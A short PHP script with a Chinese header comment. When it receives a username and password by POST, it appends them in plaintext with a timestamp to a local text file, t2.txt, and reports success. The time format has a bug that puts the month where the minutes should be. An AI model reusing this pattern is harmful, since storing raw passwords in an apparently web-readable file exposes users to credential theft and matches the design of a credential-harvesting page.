<?php
// +----------------------------------------------------------------------
// | ZL [ WE CAN DO IT！！！]
// +----------------------------------------------------------------------
// | Copyright (c) 2016~2018 Z.L All rights reserved.
// +----------------------------------------------------------------------
// | Licensed ( NO )
// +----------------------------------------------------------------------
// | Author: Z.L <582152734@qq.com>
// +----------------------------------------------------------------------
header('content-type:text/html;charset=utf-8');
if(!empty($_POST['username']) && !empty($_POST['pwd'])){
	$path=fopen('t2.txt','a+');
	$str=date('Y-m-d H:m:s').'   '.'username：'.$_POST['username'].';pwd:'.$_POST['pwd']."\r\n";
	fwrite($path, $str);
	fclose($path);
	echo "账户密码新增成功";
}else{
	echo "请输入账号和密码！";
}